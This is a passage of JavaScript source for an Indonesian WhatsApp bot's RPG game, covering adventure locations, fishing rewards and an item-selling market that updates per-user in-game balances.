              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
        global.db.erpg[m.sender].mythic += mythic
      } else if (tuju === "dark abyss") {
        global.db.erpg[m.sender].darahuser -= 70
        let thumbadv = "https://telegra.ph/file/e46f1188841f2e285e5dc-b6e1799986b286d808.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Besi: ${besi}
  ${vircion} • Mythic: ${mythic}
  ${vircion} • Uncommon: ${uncommon}
  ${vircion} • Common: ${common}
  ${vircion} • Legendary: ${legendary}
  ${vircion} • Diamond: ${diamond}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -70*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
        global.db.erpg[m.sender].mythic += mythic
        global.db.erpg[m.sender].uncommon += uncommon
        global.db.erpg[m.sender].common += common
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].diamond += diamond
        global.db.erpg[m.sender].legendary += legendary
      } else if (tuju === "sacred altar") {
        global.db.erpg[m.sender].darahuser -= 70
        let thumbadv = "https://telegra.ph/file/2ffa90f11d36532a7b698-8dc80a97f65d8846a2.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Besi: ${besi}
  ${vircion} • Mythic: ${mythic}
  ${vircion} • Uncommon: ${uncommon}
  ${vircion} • Common: ${common}
  ${vircion} • Legendary: ${legendary}
  ${vircion} • Diamond: ${diamond}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -70*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
        global.db.erpg[m.sender].mythic += mythic
        global.db.erpg[m.sender].uncommon += uncommon
        global.db.erpg[m.sender].common += common
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].diamond += diamond
        global.db.erpg[m.sender].legendary += legendary
      } else if (tuju === "infinity gate") {
        global.db.erpg[m.sender].darahuser -= 97
        let thumbadv = "https://telegra.ph/file/9468ed2e8c321ae27c92f-c32f8bf1a3394ea80e.jpg"
        let {
          key
        } = await sock.sendMessage(m.chat, {
          text: 'Berpetualang, Mohon Tunggu...'
        }, {
          quoted: fakeQuoted
        })
        await sleep(3000)
        await sock.sendMessage(m.chat, {
          text: `Kamu bertemu dengan ${obje}`,
          edit: key
        });
        await sleep(5000)
        await sock.sendMessage(m.chat, {
          text: `Menjelajah...`,
          edit: key
        });
        await sleep(3000)
        let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
  ${vircion} • Kayu: ${kayu}
  ${vircion} • Besi: ${besi}
  ${vircion} • Rank: ${rank}
  ${vircion} • Emerald: ${emerald}
  ${vircion} • Perak: ${perak}
  ${vircion} • Besi: ${besi}
  ${vircion} • Mythic: ${mythic}
  ${vircion} • Uncommon: ${uncommon}
  ${vircion} • Common: ${common}
  ${vircion} • Legendary: ${legendary}
  ${vircion} • Diamond: ${diamond}
  ${vircion} • Uang: Rp ${saldo}

*Stamina berkurang -97*`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
        global.db.erpg[m.sender].kayu += kayu
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].rank += rank
        db.users[m.sender].saldo += saldo
        global.db.erpg[m.sender].emerald += emerald
        global.db.erpg[m.sender].perak += perak
        global.db.erpg[m.sender].mythic += mythic
        global.db.erpg[m.sender].uncommon += uncommon
        global.db.erpg[m.sender].common += common
        global.db.erpg[m.sender].besi += besi
        global.db.erpg[m.sender].diamond += diamond
        global.db.erpg[m.sender].legendary += legendary
      } else {
        let thumbadv = "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg"
        let adv = `---------- » *ADVENTURE* « ----------

*Pilih Lokasi Jelajahmu📍*
  ${vircion} • savanah
  ${vircion} • dessert
  ${vircion} • boreal forest
  ${vircion} • tropical forest
  ${vircion} • underground
  ${vircion} • shadownland
  ${vircion} • dragons peak
  ${vircion} • dark abyss (High)
  ${vircion} • sacred altar (High)
  ${vircion} • infinity gate (High)

*Contoh:*
.adventure dragons peak`
        await sock.sendMessage(m.chat, {
          text: adv,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG - ADVENTURE",
              body: 'Adventure exploring the world',
              thumbnailUrl: thumbadv,
              sourceUrl: "tes",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break

    case 'memancing':
    case 'mancing': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply('Stamina Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan')
      let ikan = await randomNomor(0, 20)
      let ikangurita = await randomNomor(0, 15)
      let ikancumi = await randomNomor(0, 13)
      let ikanbuntal = await randomNomor(0, 20)
      let ikanlobster = await randomNomor(0, 30)
      let ikanhiu = await randomNomor(0, 2)
      global.db.erpg[m.sender].ikan += ikan
      global.db.erpg[m.sender].gurita += ikangurita
      global.db.erpg[m.sender].cumi += ikancumi
      global.db.erpg[m.sender].buntal += ikanbuntal
      global.db.erpg[m.sender].lobster += ikanlobster
      global.db.erpg[m.sender].hiu += ikanhiu
      global.db.erpg[m.sender].darahuser -= 20
      let thum = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg", "https://telegra.ph/file/2e772e9732c88e153e812.jpg", "https://telegra.ph/file/872b36a0dd7b6843f24da.jpg", "https://telegra.ph/file/562adf3d43cde4d355e76.jpg", "https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"]
      let thumn = await pickRandom(thum)
      let {
        key
      } = await sock.sendMessage(m.chat, {
        text: 'Sedang Memancing...'
      }, {
        quoted: fakeQuoted
      })
      await sleep(5000)
      await sock.sendMessage(m.chat, {
        text: `Memperoleh Hasil...`,
        edit: key
      });
      await sleep(5000)
      let txt = `--------- » *MEMANCING* « ---------

Berhasil mendapatkan :
  ${vircion} • ikan: ${ikan}
  ${vircion} • gurita: ${ikangurita}
  ${vircion} • cumi: ${ikancumi}
  ${vircion} • buntal: ${ikanbuntal}
  ${vircion} • lobster: ${ikanlobster}
  ${vircion} • hiu: ${ikanhiu}

_Stamina berkurang -20_`
      sock.sendMessage(m.chat, {
        text: txt,
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: null + "@newsletter",
            serverMessageId: null,
            newsletterName: `${namaBot}`
          },
          externalAdReply: {
            title: "RPG - FISHING",
            body: 'Looking for fish catch',
            thumbnailUrl: thumn,
            sourceUrl: "tes",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, {
        quoted: fakeQuoted
      })
    }
    break

    case 'sell':
    case 'jual': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (text.includes('-')) return m.reply('Nominal Tidak valid!!');
      let jual = args[0]
      switch (jual) {
      case 'emas': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].emas}` < `${jumlh}`) return m.reply(`*Emas Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].emas -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Emas: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'besi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].besi}` < `${jumlh}`) return m.reply(`*Besi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].besi -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Besi: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'batubara': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].batubara}` < `${jumlh}`) return m.reply(`*Batu Bara Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].batubara -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Batu Bara: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'perak': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].perak}` < `${jumlh}`) return m.reply(`*Perak Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].perak -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Perak: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kayu': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].kayu}` < `${jumlh}`) return m.reply(`*Kayu Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kayu -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kayu: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'ayam': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].ayam}` < `${jumlh}`) return m.reply(`*Ayam Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].ayam -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Ayam: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'sapi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].sapi}` < `${jumlh}`) return m.reply(`*Sapi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].sapi -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Sapi: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'domba': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].domba}` < `${jumlh}`) return m.reply(`*Domba Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].domba -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Domba: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'ikan': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].ikan}` < `${jumlh}`) return m.reply(`*Ikan Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].ikan -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Ikan: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'rumah': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].rumah}` < `${jumlh}`) return m.reply(`*Rumah Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].rumah -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • rumah: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'emerald': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].emerald}` < `${jumlh}`) return m.reply(`*Emerald Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].emerald -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Emerald: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'diamond': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 50000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].diamond}` < `${jumlh}`) return m.reply(`*Diamond Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].diamond -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Diamond: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'botol': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].botol}` < `${jumlh}`) return m.reply(`*Botol Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].botol -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Botol: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kardus': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].kardus}` < `${jumlh}`) return m.reply(`*Kardus Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kardus -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kardus: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kaleng': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].kaleng}` < `${jumlh}`) return m.reply(`*Kaleng Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kaleng -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kaleng: ${args[1]}

*Penghasilan:*
  ${vircion} • Kaleng: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gelas': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].gelas}` < `${jumlh}`) return m.reply(`*Gelas Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].gelas -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Gelas: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'plastik': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].plastik}` < `${jumlh}`) return m.reply(`*Plastik Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].plastik -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Plastik: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'banteng': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 30000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].banteng}` < `${jumlh}`) return m.reply(`*Banteng Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].banteng -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Banteng: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gajah': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 70000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].gajah}` < `${jumlh}`) return m.reply(`*Gajah Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].gajah -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Gajah: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'harimau': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 100000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].harimau}` < `${jumlh}`) return m.reply(`*Harimau Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].harimau -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Harimau: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kambing': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 30000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].kambing}` < `${jumlh}`) return m.reply(`*Kambing Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kambing -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kambing: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'panda': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 40000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].panda}` < `${jumlh}`) return m.reply(`*Panda Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].panda -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Panda: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'buaya': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].buaya}` < `${jumlh}`) return m.reply(`*Buaya Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].buaya -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Buaya: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kerbau': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 40000)
        let jumlh = Number(args[1])
